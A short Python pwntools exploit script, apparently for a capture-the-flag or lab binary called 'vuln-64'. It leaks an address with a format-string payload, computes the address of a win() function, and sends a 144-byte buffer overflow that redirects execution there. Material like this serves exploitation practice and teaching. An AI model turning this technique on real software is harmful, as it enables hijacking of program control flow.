#!/usr/bin/env python

from pwn import *

#Set up the process
context(os='linux', arch='amd64')
p = process('./vuln-64')

# Construct payload to leak addresses of win()
payload = b'%11$p'

# Send payload for win
p.sendline(payload)

win = int(p.recvline()[:-1], 16)
win_address = win - 0x133

#print("Got win: ", hex(win_address))

overflow = b'A' * 144
p.clean()
#Setting up payload for buffer overflow
bufexploit = bytearray(overflow)
bufexploit.extend(win_address.to_bytes(8, byteorder='little'))

#Sending payload
print("Sending exploit...")

p.sendline(bufexploit)

#First print(buffer)
print('buff', p.recvline())

#Read remaining output from the process
out = p.recvline()
print("Output: ", out)

#Close the process
p.close()
